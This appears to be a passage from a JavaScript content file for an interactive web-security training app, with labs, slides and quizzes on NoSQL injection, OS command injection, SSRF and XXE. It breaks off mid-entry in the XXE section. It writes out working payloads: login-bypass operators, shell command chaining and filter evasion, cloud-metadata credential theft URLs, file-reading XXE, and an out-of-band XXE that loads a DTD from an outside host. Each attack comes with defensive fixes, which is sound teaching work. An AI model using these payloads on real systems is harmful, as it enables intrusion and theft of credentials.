export default {
  'nosql-injection': {
    sandbox: {
      title: "MongoDB Operator Injection Lab",
      prompt: "Click a test action below (or toggle Safe Defense Mode) and observe how the server/browser processes your input:",
      inputLabel: "Authentication Payload (JSON)",
      presets: [
        {
          label: "1. Normal Login",
          input: '{"username": "wiener", "password": "peter"}',
          http: 'POST /login HTTP/1.1\nHost: target-app.com\nContent-Type: application/json\n\n{"username": "wiener", "password": "peter"}',
          serverDevBefore: 'const { username, password } = req.body;\nconst user = await db.users.findOne({',
          serverInput: '  username: "wiener",\n  password: "peter"',
          serverDevAfter: '});\nif (user) issueSession(user);',
          commentedOut: false,
          status: "200 OK · Logged In as Wiener",
          statusType: "normal",
          responsePreview: "Welcome back, wiener! (Role: User)",
          aha: "The database looked for exact string equality on both fields and returned wiener's document. The control logic and data remained cleanly separated.",
          safeServerView: '// Cast input explicitly to string literals\nconst query = {\n  username: String(req.body.username),\n  password: String(req.body.password)\n};\ndb.users.findOne(query);',
          safeStatus: "200 OK · Safe & Validated",
          safeAha: "Explicit string casting prevents non-primitive operator objects from reaching the query engine."
        },
        {
          label: "2. Operator Probe",
          input: '{"username": "admin", "password": {"$invalid": 1}}',
          http: 'POST /login HTTP/1.1\nHost: target-app.com\nContent-Type: application/json\n\n{"username": "admin", "password": {"$invalid": 1}}',
          serverDevBefore: 'const { username, password } = req.body;\nconst user = await db.users.findOne({',
          serverInput: '  username: "admin",\n  password: { "$invalid": 1 }',
          serverDevAfter: '}); // MongoServerError: unknown operator: $invalid',
          commentedOut: false,
          status: "500 Internal Error · MongoServerError",
          statusType: "error",
          responsePreview: "MongoServerError: unknown operator: $invalid at MongoDriver.runCommand",
          aha: "Passing a nested object triggered a database query operator exception rather than an invalid password failure. This diagnostic error proves the backend evaluates user keys as native NoSQL operators.",
          safeServerView: '// Input schema validation rejects unrecognized object structure\nif (typeof req.body.password !== "string") {\n  throw new ValidationError("Password must be a string");\n}',
          safeStatus: "400 Bad Request · Type Rejected",
          safeAha: "Strict type checks reject object payloads where simple strings were expected before any query runs."
        },
        {
          label: "3. Operator Bypass ($ne)",
          input: '{"username": "admin", "password": {"$ne": ""}}',
          http: 'POST /login HTTP/1.1\nHost: target-app.com\nContent-Type: application/json\n\n{"username": "admin", "password": {"$ne": ""}}',
          serverDevBefore: 'const { username, password } = req.body;\nconst user = await db.users.findOne({',
          serverInput: '  username: "admin",\n  password: { "$ne": "" }',
          serverDevAfter: '}); // Matches admin because hash is not empty string!\nissueAdminSession(user);',
          commentedOut: false,
          status: "302 Redirect · Admin Logged In",
          statusType: "bypass",
          responsePreview: "Redirecting to /admin/dashboard (Set-Cookie: session=admin_tok)",
          aha: "The $ne operator flipped the password check from 'equals peter' to 'any value not equal to blank'. Since admin's real password hash is non-empty, the condition evaluated to true and granted root access.",
          safeServerView: '// Strict schema enforcement sanitizes operator keys\nconst safePassword = mongoSanitize(req.body.password); // strips $ keys',
          safeStatus: "401 Unauthorized · Invalid Credentials",
          safeAha: "Sanitization libraries like mongo-sanitize strip leading '$' signs, treating inputs purely as literals."
        },
        {
          label: "4. Regex Exfiltration ($regex)",
          input: '{"username": "admin", "password": {"$regex": "^a.*"}}',
          http: 'POST /login HTTP/1.1\nHost: target-app.com\nContent-Type: application/json\n\n{"username": "admin", "password": {"$regex": "^a.*"}}',
          serverDevBefore: 'const user = await db.users.findOne({',
          serverInput: '  username: "admin",\n  password: { "$regex": "^a.*" }',
          serverDevAfter: '});\nreturn user ? res.send("Found") : res.send("Not Found");',
          commentedOut: false,
          status: "200 OK · Boolean Match (Found)",
          statusType: "bypass",
          responsePreview: "Account exists and matches pattern.",
          aha: "The server acts as a blind oracle by confirming if the admin password begins with 'a'. An attacker can iterate character by character to recover the entire secret token.",
          safeServerView: '// Enforce strict string comparisons, rejecting regex objects\nif (typeof password !== "string") return res.status(400);',
          safeStatus: "401 Unauthorized · Blocked",
          safeAha: "Disallowing regular expression objects in credential verification endpoints stops blind oracle character extraction."
        }
      ]
    },
    story: [
      {
        tag: "Slide 1 of 4 · 🔎 The Browser Clue",
        headline: "JSON Payload Carries Object Structure",
        nodes: ["🌐 Browser", "📡 JSON Body", "⚙️ Express Parser", "🗄️ MongoDB"],
        activeNode: 0,
        packetText: '{"password":{"$ne":""}}',
        body: "Modern web APIs accept JSON data instead of URL-encoded strings. When an attacker sends an object with a '$' symbol instead of a string, the parser faithfully preserves the nested tree.",
        takeaway: "Untrusted JSON lets clients dictate data types beyond plain text strings."
      },
      {
        tag: "Slide 2 of 4 · ⚙️ Server Action",
        headline: "Express Passes Object Directly to Query",
        nodes: ["🌐 Browser", "📡 JSON Body", "⚙️ Express Parser", "🗄️ MongoDB"],
        activeNode: 2,
        packetText: "req.body.password -> Object",
        body: "The Node.js server extracts req.body fields without checking if password is a string. It directly merges the input object into the MongoDB collection query document.",
        takeaway: "Implicit type trust enables client data structures to become server database commands."
      },
      {
        tag: "Slide 3 of 4 · 💥 The Break",
        headline: "MongoDB Interprets Key as an Operator",
        nodes: ["🌐 Browser", "📡 JSON Body", "⚙️ Express Parser", "🗄️ MongoDB"],
        activeNode: 3,
        packetText: "$ne: '' evaluated",
        body: "MongoDB inspects the query object, encounters the reserved '$ne' token, and turns it into a 'Not Equal' operator. The equality match is deleted, matching any document where password is not empty.",
        takeaway: "Data turned into code because the database syntax shares the exact same JSON format as the user payload."
      },
      {
        tag: "Slide 4 of 4 · 🛡️ The Fix",
        headline: "Enforce Schema Types & Sanitize Operators",
        nodes: ["🌐 Browser", "📡 JSON Body", "⚙️ Express Parser", "🗄️ MongoDB"],
        activeNode: 2,
        packetText: "Type Coercion & Schema",
        body: "Enforce strict schema types with Mongoose or Joi, and use packages like mongo-sanitize to strip all '$' prefix keys. Casting inputs with String(req.body.password) ensures it is never treated as a query operator.",
        takeaway: "Never feed raw JSON objects straight into MongoDB query arguments without type pinning."
      }
    ],
    puzzle: {
      question: "10-Second Prediction: What happens when the server executes this query?",
      code: '// Express with bodyParser.json()\ndb.users.find({ username: req.body.user, role: "admin" })\n// Input sent: { "user": { "$gt": "" } }',
      options: [
        { text: "The database throws a syntax error because $gt requires numbers.", correct: false, feedback: "MongoDB's $gt works on strings and object values across BSON data types." },
        { text: "It returns every admin document because any non-empty string is greater than ''.", correct: true, feedback: "Spot on! The '$gt' operator matches all existing usernames, dumping every administrative record." },
        { text: "It returns null because req.body.user is not a string.", correct: false, feedback: "MongoDB doesn't crash on objects; it treats the nested object as an operator expression." }
      ]
    },
    connections: [
      {
        clue: '👁️ What You Notice: Submitting JSON like {"username": {"$ne": null}} yields a 200 OK while wrong passwords return 401.',
        mechanism: "⚙️ What It Means Under the Hood: The backend deserializes JSON into native objects and passes them directly to MongoDB without type validation.",
        nextMove: '🎯 How to Verify: Send {"username": {"$regex": "^adm.*"}} to check if wildcards return positive match states.'
      },
      {
        clue: "👁️ What You Notice: Changing a URL parameter from ?user=bob to ?user[$ne]=bob returns multiple users.",
        mechanism: "⚙️ What It Means Under the Hood: The body/query parser (like Express 'qs') auto-converts bracket notation into nested JavaScript objects.",
        nextMove: "🎯 How to Verify: Test array/dictionary injection on search or filter parameters to observe result count differences."
      },
      {
        clue: "👁️ What You Notice: Sending JavaScript syntax inside a query parameter results in timed delays or syntax errors.",
        mechanism: "⚙️ What It Means Under the Hood: The query is using MongoDB's $where operator, which evaluates raw JavaScript expressions in the database engine.",
        nextMove: '🎯 How to Verify: Inject boolean expressions like \'this.password[0] == "a"\' or \'sleep(5000)\' to confirm JavaScript engine execution.'
      }
    ],
    quiz: [
      {
        q: "Why is MongoDB uniquely vulnerable to operator injection when handling JSON bodies?",
        options: [
          { text: "MongoDB queries are written using the exact same JSON/BSON document format as incoming HTTP requests.", correct: true, why: "Correct! Because query syntax and input data share the same format, untrusted nested objects become query commands." },
          { text: "MongoDB does not support user authentication or password hashing.", correct: false, why: "Remember that authentication works normally; the flaw is unvalidated query structure interpretation." }
        ]
      },
      {
        q: "Which defense completely prevents MongoDB operator injection on an authentication endpoint?",
        options: [
          { text: "URL-encoding all special characters before sending them in JSON.", correct: false, why: "URL encoding doesn't stop JSON parsers from producing objects once deserialized." },
          { text: "Validating that username and password are strictly primitive string types before querying.", correct: true, why: "Exactly! Forcing values to strings prevents any operator object like {'$ne': ''} from executing." }
        ]
      }
    ]
  },

  'os-command-injection': {
    sandbox: {
      title: "OS Command Execution Simulator",
      prompt: "Click a test action below (or toggle Safe Defense Mode) and observe how the server/browser processes your input:",
      inputLabel: "Command Parameter (Store ID / Ping Target)",
      presets: [
        {
          label: "1. Normal Parameter",
          input: "1",
          http: "POST /product/stock HTTP/1.1\nHost: target-shop.com\nContent-Type: application/x-www-form-urlencoded\n\nproductId=3&storeId=1",
          serverDevBefore: '// Backend runs inventory CLI tool\nconst cmd = "stockreport.sh " + req.body.storeId;\nexec(cmd, (err, stdout) => {',
          serverInput: "stockreport.sh 1",
          serverDevAfter: '  res.send({ stock: stdout.trim() });\n});',
          commentedOut: false,
          status: "200 OK · Stock: 42 Units",
          statusType: "normal",
          responsePreview: '{"stock": "42"}',
          aha: "The argument '1' was passed into the stock script cleanly. The shell executed only the intended program with standard arguments.",
          safeServerView: '// execFile does not invoke a shell wrapper\nexecFile("stockreport.sh", [req.body.storeId], (err, stdout) => {\n  res.send({ stock: stdout.trim() });\n});',
          safeStatus: "200 OK · Safe Execution",
          safeAha: "Passing arguments as an array directly to the OS prevents shell metacharacters from being interpreted."
        },
        {
          label: "2. Metacharacter Probe",
          input: "1;",
          http: "POST /product/stock HTTP/1.1\nHost: target-shop.com\nContent-Type: application/x-www-form-urlencoded\n\nproductId=3&storeId=1;",
          serverDevBefore: 'const cmd = "stockreport.sh " + req.body.storeId;\nexec(cmd, (err, stdout, stderr) => {',
          serverInput: "stockreport.sh 1;",
          serverDevAfter: '  // Shell terminates first command, waits for next\n  res.send({ stock: stdout });\n});',
          commentedOut: false,
          status: "200 OK · Empty Output / Syntax Glitch",
          statusType: "error",
          responsePreview: '{"stock": "42"}',
          aha: "The trailing semicolon was treated as a command separator by the underlying bash shell. It completed the first command and attempted to run an empty second command.",
          safeServerView: 'if (!/^[0-9]+$/.test(req.body.storeId)) {\n  throw new Error("Invalid numeric ID");\n}',
          safeStatus: "400 Bad Request · Numeric Validation",
          safeAha: "Strict regex allowlisting rejects any character that is not a numeric digit."
        },
        {
          label: "3. Command Chaining (| whoami)",
          input: "1|whoami",
          http: "POST /product/stock HTTP/1.1\nHost: target-shop.com\nContent-Type: application/x-www-form-urlencoded\n\nproductId=3&storeId=1|whoami",
          serverDevBefore: 'const cmd = "stockreport.sh " + req.body.storeId;\nexec(cmd, (err, stdout) => {',
          serverInput: "stockreport.sh 1 | whoami",
          serverDevAfter: '  // stdout contains output of the second piped command!\n  res.send({ result: stdout.trim() });\n});',
          commentedOut: false,
          status: "200 OK · In-Band Shell Hijack",
          statusType: "bypass",
          responsePreview: '{"result": "www-data"}',
          aha: "The pipe character redirected the script output to whoami, which executed under the web server's OS privileges. The attacker now runs arbitrary system binaries.",
          safeServerView: 'execFile("stockreport.sh", [storeId], (err, out) => {\n  res.send({ stock: out });\n});',
          safeStatus: "400 Bad Request · Sanitized",
          safeAha: "Without a shell sub-process, the pipe character is passed as a literal string argument to the script."
        },
        {
          label: "4. Blind Exfiltration (sleep)",
          input: "1; sleep 5",
          http: "POST /product/stock HTTP/1.1\nHost: target-shop.com\nContent-Type: application/x-www-form-urlencoded\n\nproductId=3&storeId=1; sleep 5",
          serverDevBefore: '// Server runs command asynchronously with no output returned\nconst cmd = "stockreport.sh " + req.body.storeId;\nexec(cmd);',
          serverInput: "stockreport.sh 1; sleep 5",
          serverDevAfter: '// Process halts for 5000ms before HTTP response ends\nres.send({ status: "done" });',
          commentedOut: false,
          status: "200 OK · 5,023ms Latency",
          statusType: "bypass",
          responsePreview: "HTTP response delayed by 5.02 seconds.",
          aha: "Even without printed command output, the 5-second roundtrip delay proves arbitrary code execution. Time delays allow inferential data harvesting through blind injection.",
          safeServerView: 'execFile("/usr/bin/stockreport", [storeId]);',
          safeStatus: "200 OK · Instant Execution",
          safeAha: "Direct process spawns never spawn an intermediate /bin/sh shell, rendering command separators inert."
        }
      ]
    },
    story: [
      {
        tag: "Slide 1 of 4 · 🔎 The Browser Clue",
        headline: "User Submits Form with Special Characters",
        nodes: ["🌐 Web Browser", "📡 HTTP Parameter", "⚙️ Server Exec", "💻 OS Shell (/bin/sh)"],
        activeNode: 0,
        packetText: "storeId=1|whoami",
        body: "A user submits a form where parameters like store IDs or usernames are sent to the web backend. The attacker adds shell separators like semicolons, pipes, or ampersands.",
        takeaway: "Shell metacharacters (&, |, ;, `) signify command boundaries to operating system shells."
      },
      {
        tag: "Slide 2 of 4 · ⚙️ Server Action",
        headline: "Server Concatenates Strings Into Shell Command",
        nodes: ["🌐 Web Browser", "📡 HTTP Parameter", "⚙️ Server Exec", "💻 OS Shell (/bin/sh)"],
        activeNode: 2,
        packetText: "exec('script ' + input)",
        body: "The application uses functions like system() or child_process.exec() to build a shell string dynamically. It pastes untrusted input directly between arguments without quoting or parameter binding.",
        takeaway: "Using shell-launching functions converts raw user text into executable terminal instructions."
      },
      {
        tag: "Slide 3 of 4 · 💥 The Break",
        headline: "OS Shell Splits and Executes New Command",
        nodes: ["🌐 Web Browser", "📡 HTTP Parameter", "⚙️ Server Exec", "💻 OS Shell (/bin/sh)"],
        activeNode: 3,
        packetText: "Spawns subshell: whoami",
        body: "The operating system shell (/bin/sh) parses the line, recognizes the separator, and launches an independent child process. The injected command executes with the permissions of the web server daemon.",
        takeaway: "The process boundary was breached because the application delegated argument parsing to a command shell."
      },
      {
        tag: "Slide 4 of 4 · 🛡️ The Fix",
        headline: "Avoid Shells and Use Parameterized APIs",
        nodes: ["🌐 Web Browser", "📡 HTTP Parameter", "⚙️ Server Exec", "💻 OS Shell (/bin/sh)"],
        activeNode: 2,
        packetText: "execFile(cmd, [args])",
        body: "Replace shell execution calls with direct process spawns like execFile() or subprocess.run(shell=False). Combine this with rigid allowlists (such as validating integers) to reject all unexpected symbols.",
        takeaway: "Executing binaries directly with argument vectors guarantees user strings never become shell commands."
      }
    ],
    puzzle: {
      question: "10-Second Prediction: What will happen when this PHP code runs?",
      code: '$email = $_POST[\'email\']; // input: test@site.com; cat /etc/passwd\nsystem("echo " . $email . " >> /tmp/leads.txt");',
      options: [
        { text: "The shell treats everything after ';' as a comment and ignores it.", correct: false, feedback: "In bash and sh, '#' is the comment symbol; ';' separates distinct commands." },
        { text: "It appends the email, then dumps /etc/passwd directly to the HTTP response.", correct: true, feedback: "Spot on! Semicolons terminate the echo command and immediately launch cat /etc/passwd in the shell." },
        { text: "PHP escapes the input automatically before calling the system shell.", correct: false, feedback: "PHP's system() function does zero automatic escaping unless escapeshellcmd() is explicitly called." }
      ]
    },
    connections: [
      {
        clue: "👁️ What You Notice: An endpoint takes an IP address, domain name, or filename and returns console-like text.",
        mechanism: "⚙️ What It Means Under the Hood: The backend is shelling out to utility binaries like ping, traceroute, convert, or mail.",
        nextMove: "🎯 How to Verify: Append a benign command separator like '& ping -c 1 127.0.0.1 &' to test for execution."
      },
      {
        clue: "👁️ What You Notice: The page does not reflect any command output, but the request hangs when you send 'sleep 10'.",
        mechanism: "⚙️ What It Means Under the Hood: You have blind OS command injection; the shell blocks the thread until the sleep finishes.",
        nextMove: "🎯 How to Verify: Alternate between sleep 2 and sleep 10 to establish a statistically reliable time correlation."
      },
      {
        clue: "👁️ What You Notice: Spaces in your payload cause 500 errors or immediate validation rejections.",
        mechanism: "⚙️ What It Means Under the Hood: The application or shell tokenizer splits on whitespace, or a simple WAF rule matches spaces.",
        nextMove: "🎯 How to Verify: Substitute spaces with ${IFS}, $IFS$9, or brace expansion like {cat,/etc/passwd}."
      }
    ],
    quiz: [
      {
        q: "What is the primary architectural cause of OS command injection vulnerabilities?",
        options: [
          { text: "Passing concatenated user input to a command shell interpreter like /bin/sh.", correct: true, why: "Correct! The shell interpreter treats metacharacters as syntax commands instead of literal data." },
          { text: "Running the web application on a Linux server instead of Windows.", correct: false, why: "Both Windows (cmd.exe/powershell.exe) and Linux are equally susceptible to command injection." }
        ]
      },
      {
        q: "Which programming practice provides the strongest defense against command injection?",
        options: [
          { text: "Invoking binaries with direct argument lists (e.g. execFile or shell=False) without a shell.", correct: true, why: "Exactly! Direct process invocation bypasses shell parsing completely, making argument injection impossible." },
          { text: "Stripping single quotes and double quotes from user inputs.", correct: false, why: "Metacharacters like |, &, and ; still function without quotes." }
        ]
      }
    ]
  },

  'server-side-request-forgery-ssrf': {
    sandbox: {
      title: "SSRF Internal Boundary Simulator",
      prompt: "Click a test action below (or toggle Safe Defense Mode) and observe how the server/browser processes your input:",
      inputLabel: "Resource / Webhook URL",
      presets: [
        {
          label: "1. Normal Remote Fetch",
          input: "https://partner-cdn.com/logo.png",
          http: "POST /api/fetch-avatar HTTP/1.1\nHost: portal.site.com\nContent-Type: application/x-www-form-urlencoded\n\nimageUrl=https://partner-cdn.com/logo.png",
          serverDevBefore: 'const url = req.body.imageUrl;\n// Backend downloads avatar image\nconst response = await fetch(url);',
          serverInput: "fetch('https://partner-cdn.com/logo.png')",
          serverDevAfter: "const buffer = await response.buffer();\nres.type('image/png').send(buffer);",
          commentedOut: false,
          status: "200 OK · Image Loaded (3.4 KB)",
          statusType: "normal",
          responsePreview: "[PNG Binary Stream Rendered: 200x200]",
          aha: "The backend server contacted the public third-party URL as intended and relayed the avatar image back to the client.",
          safeServerView: '// Validate domain against strict whitelist\nconst host = new URL(url).hostname;\nif (!ALLOWED_HOSTS.has(host)) throw new Error("Host not permitted");',
          safeStatus: "200 OK · Domain Whitelisted",
          safeAha: "Domain whitelists ensure the backend only communicates with pre-approved external partners."
        },
        {
          label: "2. Loopback Probe (127.0.0.1)",
          input: "http://127.0.0.1:8080/metrics",
          http: "POST /api/fetch-avatar HTTP/1.1\nHost: portal.site.com\nContent-Type: application/x-www-form-urlencoded\n\nimageUrl=http://127.0.0.1:8080/metrics",
          serverDevBefore: 'const url = req.body.imageUrl;\nconst response = await fetch(url);',
          serverInput: "fetch('http://127.0.0.1:8080/metrics')",
          serverDevAfter: '// Internal microservice answers localhost\nres.send(await response.text());',
          commentedOut: false,
          status: "200 OK · Internal Metrics Leaked",
          statusType: "bypass",
          responsePreview: "prometheus_cpu_seconds_total 1492.2\nprocess_resident_memory_bytes 419430400",
          aha: "The server fetched its own local loopback interface. Because the request came from 127.0.0.1, the internal metrics port accepted it without requiring credentials.",
          safeServerView: '// Resolve DNS and assert public address space\nconst ip = await resolveDns(new URL(url).hostname);\nif (isPrivateOrLoopback(ip)) throw new SecurityException("Private IP blocked");',
          safeStatus: "403 Forbidden · Loopback Denied",
          safeAha: "IP resolution checks detect and block requests targeting localhost or RFC 1918 private ranges."
        },
        {
          label: "3. Internal Admin Action",
          input: "http://localhost/admin/delete?user=carlos",
          http: "POST /api/fetch-avatar HTTP/1.1\nHost: portal.site.com\nContent-Type: application/x-www-form-urlencoded\n\nimageUrl=http://localhost/admin/delete?user=carlos",
          serverDevBefore: '// Server proxies request to target URL\nconst resProxy = await fetch(req.body.imageUrl);',
          serverInput: "fetch('http://localhost/admin/delete?user=carlos')",
          serverDevAfter: '// Internal admin endpoint trusts localhost caller!\nres.send(await resProxy.text());',
          commentedOut: false,
          status: "200 OK · User Carlos Deleted",
          statusType: "bypass",
          responsePreview: "User account 'carlos' successfully purged by Admin.",
          aha: "The internal administration API checked if remoteAddress === '127.0.0.1'. Because the backend server itself dispatched the HTTP call, authentication was completely bypassed.",
          safeServerView: '// Reject requests to unroutable or loopback networks\nblockPrivateSubnets(url);\nrequireMutualTlsOrAuthOnInternalAdmin();',
          safeStatus: "403 Forbidden · Private Request Dropped",
          safeAha: "Network segmentation and explicit authentication on internal services prevent blind trust of local network calls."
        },
        {
          label: "4. Cloud Metadata API (IMDSv1)",
          input: "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role",
          http: "POST /api/fetch-avatar HTTP/1.1\nHost: portal.site.com\nContent-Type: application/x-www-form-urlencoded\n\nimageUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role",
          serverDevBefore: 'const url = req.body.imageUrl;\nconst cloudRes = await fetch(url);',
          serverInput: "fetch('http://169.254.169.254/latest/.../admin-role')",
          serverDevAfter: 'res.send(await cloudRes.json());',
          commentedOut: false,
          status: "200 OK · IAM Keys Compromised",
          statusType: "bypass",
          responsePreview: '{"AccessKeyId": "ASIA...", "SecretAccessKey": "wJalrXUtn...", "Token": "FQoG..."}',
          aha: "The instance metadata endpoint (169.254.169.254) is non-routable on the public internet but fully accessible to virtual machines. The attacker extracted temporary AWS cloud credentials.",
          safeServerView: '// Enforce IMDSv2 token header or block link-local via host routing\niptables.block("169.254.169.254");',
          safeStatus: "403 Forbidden · Metadata Prohibited",
          safeAha: "Disabling IMDSv1 in favor of IMDSv2 requires a PUT session token header that basic SSRF vectors cannot generate."
        }
      ]
    },
    story: [
      {
        tag: "Slide 1 of 4 · 🔎 The Browser Clue",
        headline: "User Supplies a Remote URL Parameter",
        nodes: ["🌐 Browser", "📡 HTTP Request", "⚙️ Server HTTP Client", "☁️ Internal / Metadata"],
        activeNode: 0,
        packetText: "url=http://169.254.169.254",
        body: "Features like profile import, webhook notifications, and PDF generators accept remote URLs. The user supplies an address that targets internal network coordinates instead of a public asset.",
        takeaway: "Any user input specifying a destination hostname is a candidate for server-side request redirection."
      },
      {
        tag: "Slide 2 of 4 · ⚙️ Server Action",
        headline: "Server Backend Issues Socket Connection",
        nodes: ["🌐 Browser", "📡 HTTP Request", "⚙️ Server HTTP Client", "☁️ Internal / Metadata"],
        activeNode: 2,
        packetText: "Server creates new socket",
        body: "The application server creates an outbound TCP socket to the provided address. Because the call originates inside the corporate firewall, firewalls and routers allow it through.",
        takeaway: "The server acts as an unwitting forward proxy for the attacker inside protected network perimeters."
      },
      {
        tag: "Slide 3 of 4 · 💥 The Break",
        headline: "Internal Service Trusts Local Origin",
        nodes: ["🌐 Browser", "📡 HTTP Request", "⚙️ Server HTTP Client", "☁️ Internal / Metadata"],
        activeNode: 3,
        packetText: "HTTP GET /admin -> 200 OK",
        body: "The targeted internal service (e.g. Redis, localhost admin panels, cloud metadata) answers the request without credentials because it assumes local traffic is authentic.",
        takeaway: "Perimeter trust models crumble when servers make unconstrained outbound HTTP requests on user request."
      },
      {
        tag: "Slide 4 of 4 · 🛡️ The Fix",
        headline: "Resolve IP, Check Private Subnets, Require IMDSv2",
        nodes: ["🌐 Browser", "📡 HTTP Request", "⚙️ Server HTTP Client", "☁️ Internal / Metadata"],
        activeNode: 2,
        packetText: "Validate resolved IP & enforce IMDSv2",
        body: "Resolve the domain name first, verify that the resulting IP is not loopback, private (RFC 1918), or link-local (169.254.x.x), and lock down cloud instance metadata with IMDSv2.",
        takeaway: "Never connect to user-supplied URLs without pre-resolving DNS and asserting public IP space."
      }
    ],
    puzzle: {
      question: "10-Second Prediction: An app blocks '127.0.0.1' and 'localhost'. What happens if you submit 'http://2130706433/'?",
      code: '// Naive filter:\nif (url.includes("127.0.0.1") || url.includes("localhost")) {\n  return res.status(403).send("Forbidden");\n}\nfetch(url);',
      options: [
        { text: "The request fails with an invalid URL hostname exception.", correct: false, feedback: "Dword integer IP notation is valid in standard URI syntax and POSIX socket libraries." },
        { text: "The request bypasses the string check and connects straight to 127.0.0.1.", correct: true, feedback: "Spot on! 2130706433 is the 32-bit decimal integer equivalent of 127.0.0.1, bypassing basic string matching." },
        { text: "The server converts 2130706433 into an external IPv6 address.", correct: false, feedback: "Operating system socket resolvers convert 32-bit decimal values directly to IPv4 loopback." }
      ]
    },
    connections: [
      {
        clue: "👁️ What You Notice: An endpoint asks for a URL to generate an image thumbnail, PDF preview, or fetch RSS feeds.",
        mechanism: "⚙️ What It Means Under the Hood: A backend worker is downloading arbitrary HTTP/HTTPS endpoints on behalf of the client.",
        nextMove: "🎯 How to Verify: Point the URL to a controlled web listener (like Burp Collaborator) to inspect outgoing headers and internal IP."
      },
      {
        clue: "👁️ What You Notice: Inputting 'http://127.0.0.1' returns 'URL blocked by security filter'.",
        mechanism: "⚙️ What It Means Under the Hood: A blacklist regex is inspecting host strings rather than resolved IP destinations.",
        nextMove: "🎯 How to Verify: Test alternate loopback representations: 127.1, 0.0.0.0, [::], decimal 2130706433, or registered DNS redirects like lvh.me."
      },
      {
        clue: "👁️ What You Notice: The application accepts redirect responses (301/302) from external sites.",
        mechanism: "⚙️ What It Means Under the Hood: The initial URL validation passed on an external domain, but the HTTP client followed the 302 redirect directly into localhost.",
        nextMove: "🎯 How to Verify: Host an external redirector that points to http://169.254.169.254 or configure DNS rebinding."
      }
    ],
    quiz: [
      {
        q: "Why is blacklisting the words 'localhost' and '127.0.0.1' ineffective at stopping SSRF?",
        options: [
          { text: "Attackers can use alternate IP representations (hex, octal, integer, IPv6) or DNS records that resolve to loopback.", correct: true, why: "Correct! Sockets resolve hostnames like 127.0.0.1 via hundreds of synonyms and custom DNS aliases." },
          { text: "Localhost is not used by servers in production environments.", correct: false, why: "Localhost is widely used for internal daemons, database connections, and reverse proxies." }
        ]
      },
      {
        q: "How does AWS IMDSv2 mitigate Cloud Metadata SSRF vulnerabilities?",
        options: [
          { text: "It disables HTTP access completely and only allows SSH.", correct: false, why: "IMDSv2 still uses HTTP, but adds session token requirements." },
          { text: "It mandates a secret session token obtained via an HTTP PUT request with custom headers.", correct: true, why: "Exactly! Most SSRF bugs can only perform GET or POST requests and cannot forge arbitrary PUT request headers." }
        ]
      }
    ]
  },

  'xml-external-entity-xxe-injection': {
    sandbox: {
      title: "XML Parser & DTD Entity Lab",
      prompt: "Click a test action below (or toggle Safe Defense Mode) and observe how the server/browser processes your input:",
      inputLabel: "XML Document Payload",
      presets: [
        {
          label: "1. Normal XML Document",
          input: '<?xml version="1.0"?><stockCheck><productId>381</productId><storeId>1</storeId></stockCheck>',
          http: 'POST /product/stock HTTP/1.1\nHost: target-shop.com\nContent-Type: application/xml\n\n<?xml version="1.0"?><stockCheck><productId>381</productId><storeId>1</storeId></stockCheck>',
          serverDevBefore: '// XML Document parsed by libxml/SAX\nconst doc = parseXml(req.body);\nconst id = doc.find("//productId").text();',
          serverInput: "<productId>381</productId>",
          serverDevAfter: 'const count = db.lookupStock(id);\nres.send(`<stock>${count}</stock>`);',
          commentedOut: false,
          status: "200 OK · Stock: 89",
          statusType: "normal",
          responsePreview: "<stock>89</stock>",
          aha: "The XML parser processed elements as standard data nodes and extracted product ID 381 to complete the query.",
          safeServerView: '// Parser configured with external entities disabled\nxmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);',
          safeStatus: "200 OK · Safe Parse",
          safeAha: "Disallowing DOCTYPE declarations removes DTD processing entirely from the XML parsing cycle."
        },
        {
          label: "2. Custom Entity Probe",
          input: '<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY custom "PONG"> ]><stockCheck><productId>&custom;</productId></stockCheck>',
          http: 'POST /product/stock HTTP/1.1\nHost: target-shop.com\nContent-Type: application/xml\n\n<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY custom "PONG"> ]><stockCheck><productId>&custom;</productId></stockCheck>',
          serverDevBefore: '// Parser evaluates DTD entity references\nconst doc = parseXml(req.body);',
          serverInput: "<productId>&custom;</productId> -> expands to 'PONG'",
          serverDevAfter: '// Backend reflects parsed entity in error or query\nres.send("Product not found: PONG");',
          commentedOut: false,
          status: "200 OK · Entity Expanded",
          statusType: "normal",
          responsePreview: "Product not found: PONG",
          aha: "The parser resolved &custom; to 'PONG'. Seeing the entity value reflected in the application response proves that entity expansion is enabled.",
          safeServerView: 'parser.setFeature("http://xml.org/sax/features/external-general-entities", false);',
          safeStatus: "400 Bad Request · Entity Blocked",
          safeAha: "Disabling general entity resolution instructs the parser to treat entity definitions as errors."
        },
        {
          label: "3. File Disclosure (SYSTEM /etc/passwd)",
          input: '<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId></stockCheck>',
          http: 'POST /product/stock HTTP/1.1\nHost: target-shop.com\nContent-Type: application/xml\n\n<?xml version="1.0"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId></stockCheck>',
          serverDevBefore: '// XML parser opens local filesystem resource\nconst doc = parseXml(req.body);',
          serverInput: "SYSTEM 'file:///etc/passwd' loaded into &xxe;",
          serverDevAfter: '// Product search returns file content in response\nres.send("Invalid product ID: " + doc.find("//productId").text());',
          commentedOut: false,
          status: "200 OK · File Exfiltrated",
          statusType: "bypass",
          responsePreview: "Invalid product ID: root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon...",
          aha: "The SYSTEM handler caused the server's XML engine to read /etc/passwd from disk and interpolate its contents directly into the XML tree before processing.",
          safeServerView: '// Full XML entity defense configuration\ndomParser.setFeature("http://xml.org/sax/features/external-general-entities", false);\ndomParser.setFeature("http://xml.org/sax/features/external-parameter-entities", false);',
          safeStatus: "400 Bad Request · DTD Forbidden",
          safeAha: "Blocking external general and parameter entities prevents file system URI schemes from resolving."
        },
        {
          label: "4. Out-of-Band (OOB) XXE",
          input: '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://burpcollab.net/eval.dtd"> %xxe; ]><stockCheck><productId>1</productId></stockCheck>',
          http: 'POST /product/stock HTTP/1.1\nHost: target-shop.com\nContent-Type: application/xml\n\n<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://burpcollab.net/eval.dtd"> %xxe; ]><stockCheck><productId>1</productId></stockCheck>',
